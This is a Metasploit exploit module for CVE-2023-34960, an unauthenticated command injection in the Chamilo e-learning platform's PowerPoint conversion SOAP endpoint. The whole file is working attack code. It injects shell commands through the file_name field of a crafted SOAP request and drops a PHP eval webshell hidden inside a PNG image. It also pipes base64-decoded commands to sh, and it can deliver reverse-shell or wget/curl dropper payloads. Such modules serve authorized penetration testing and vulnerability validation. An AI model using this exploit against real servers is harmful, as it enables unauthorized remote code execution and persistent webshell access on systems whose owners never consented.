# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework

class MetasploitModule < Msf::Exploit::Remote

  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager
  include Msf::Exploit::FileDropper
  include Msf::Exploit::Format::PhpPayloadPng
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Chamilo unauthenticated command injection in PowerPoint upload',
        'Description' => %q{
          Chamilo is an e-learning platform, also called Learning Management Systems (LMS).
          This module exploits an unauthenticated remote command execution vulnerability
          that affects Chamilo versions `1.11.18` and below (CVE-2023-34960).
          Due to a functionality called Chamilo Rapid to easily convert PowerPoint
          slides to courses on Chamilo, it is possible for an unauthenticated remote
          attacker to execute arbitrary commands at OS level using a malicious SOAP
          request at the vulnerable endpoint `/main/webservices/additional_webservices.php`.
        },
        'Author' => [
          'h00die-gr3y <h00die.gr3y[at]gmail.com>', # Module Author
          'Randorisec' # Original research
        ],
        'References' => [
          ['CVE', '2023-34960'],
          ['URL', 'https://www.randorisec.fr/pt/chamilo-1.11.18-multiple-vulnerabilities'],
          ['URL', 'https://attackerkb.com/topics/VVJpMeSpUP/cve-2023-34960']
        ],
        'License' => MSF_LICENSE,
        'Platform' => ['php', 'unix', 'linux'],
        'Privileged' => false,
        'Arch' => [ARCH_PHP, ARCH_CMD, ARCH_X64, ARCH_X86, ARCH_AARCH64],
        'Targets' => [
          [
            'PHP',
            {
              'Platform' => 'php',
              'Arch' => ARCH_PHP,
              'Type' => :php,
              'DefaultOptions' => {
                'PAYLOAD' => 'php/meterpreter/reverse_tcp'
              }
            }
          ],
          [
            'Unix Command',
            {
              'Platform' => 'unix',
              'Arch' => ARCH_CMD,
              'Type' => :unix_cmd,
              'DefaultOptions' => {
                'PAYLOAD' => 'cmd/unix/reverse_bash'
              }
            }
          ],
          [
            'Linux Dropper',
            {
              'Platform' => 'linux',
              'Arch' => [ARCH_X64, ARCH_X86, ARCH_AARCH64],
              'Type' => :linux_dropper,
              'Linemax' => 65535,
              'CmdStagerFlavor' => ['wget', 'curl'],
              'DefaultOptions' => {
                'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp'
              }
            }
          ]
        ],
        'DefaultTarget' => 0,
        'DisclosureDate' => '2023-06-01',
        'DefaultOptions' => {
          'SSL' => false,
          'RPORT' => 80
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [ARTIFACTS_ON_DISK, IOC_IN_LOGS],
          'Reliability' => [REPEATABLE_SESSION]
        }
      )
    )
    register_options([
      OptString.new('TARGETURI', [ true, 'The Chamilo endpoint URL', '/' ]),
      OptString.new('WEBSHELL', [
        false, 'The name of the webshell with extension. Webshell name will be randomly generated if left unset.', nil
      ], conditions: %w[TARGET == 0])
    ])
  end

  def soap_request(cmd)
    # create SOAP request exploiting CVE-2023-34960

    # Randomize ppt size
    ppt_size = "#{rand(720..1440)}x#{rand(360..720)}"

    return <<~EOS
      <?xml version="1.0" encoding="UTF-8"?>
      <SOAP-ENV:Envelope
        xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"
        xmlns:ns1="#{target_uri.path}"
        xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xmlns:xsd="http://www.w3.org/2001/XMLSchema"
        xmlns:ns2="http://xml.apache.org/xml-soap"
        xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/"
        SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
        <SOAP-ENV:Body>
          <ns1:wsConvertPpt>
            <param0 xsi:type="ns2:Map">
              <item>
                <key xsi:type="xsd:string">file_data</key>
                <value xsi:type="xsd:string"></value>
              </item>
              <item>
                <key xsi:type="xsd:string">file_name</key>
                <value xsi:type="xsd:string">`{{}}`.pptx'|" |#{cmd}||a #</value>
              </item>
              <item>
                <key xsi:type="xsd:string">service_ppt2lp_size</key>
                <value xsi:type="xsd:string">#{ppt_size}</value>
              </item>
            </param0>
          </ns1:wsConvertPpt>
        </SOAP-ENV:Body>
      </SOAP-ENV:Envelope>
    EOS
  end

  def upload_webshell
    # randomize file name if option WEBSHELL is not set
    @webshell_name = if datastore['WEBSHELL'].blank?
                       "#{Rex::Text.rand_text_alpha(8..16)}.php"
                     else
                       datastore['WEBSHELL'].to_s
                     end

    @post_param = Rex::Text.rand_text_alphanumeric(1..8)

    # inject PHP payload into the PLTE chunk of a PNG image to hide the payload
    php_payload = "<?php @eval(base64_decode($_POST[\'#{@post_param}\']));?>"
    png_webshell = inject_php_payload_png(php_payload, injection_method: 'PLTE')
    return nil if png_webshell.nil?

    # encode webshell data and write to file on the target for execution
    payload = Base64.strict_encode64(png_webshell.to_s)
    cmd = "echo #{payload}|openssl enc -a -d > ./#{@webshell_name}"

    return send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'main', 'webservices', 'additional_webservices.php'),
      'ctype' => 'text/xml; charset=utf-8',
      'data' => soap_request(cmd).to_s
    })
  end

  def execute_php(cmd, _opts = {})
    payload = Base64.strict_encode64(cmd)
    return send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'main', 'inc', 'lib', 'ppt2png', @webshell_name),
      'ctype' => 'application/x-www-form-urlencoded',
      'vars_post' => {
        @post_param => payload
      }
    })
  end

  def execute_command(cmd, _opts = {})
    # Encode payload with base64 and decode with openssl (most common installed on unix systems)
    payload = Base64.strict_encode64(cmd)
    cmd = "echo #{payload}|openssl enc -a -d|sh"

    return send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'main', 'webservices', 'additional_webservices.php'),
      'ctype' => 'text/xml; charset=utf-8',
      'data' => soap_request(cmd).to_s
    })
  end

  def check
    # Checking if the target is vulnerable by echoing a randomised marker that will return the marker in the response.
    print_status("Checking if #{peer} can be exploited.")
    marker = Rex::Text.rand_text_alphanumeric(8..16)
    res = execute_command("echo #{marker}")
    if res && res.code == 200 && res.body.include?('wsConvertPptResponse') && res.body.include?(marker)
      CheckCode::Vulnerable
    else
      CheckCode::Safe('No valid response received from the target.')
    end
  end

  def exploit
    print_status("Executing #{target.name} for #{datastore['PAYLOAD']}")
    case target['Type']
    when :php
      res = upload_webshell
      fail_with(Failure::PayloadFailed, 'Web shell upload error.') unless res && res.code == 200 && res.body.include?('wsConvertPptResponse')
      register_file_for_cleanup(@webshell_name.to_s)
      execute_php(payload.encoded)
    when :unix_cmd
      execute_command(payload.encoded)
    when :linux_dropper
      execute_cmdstager({ linemax: target.opts['Linemax'] })
    end
  end
end
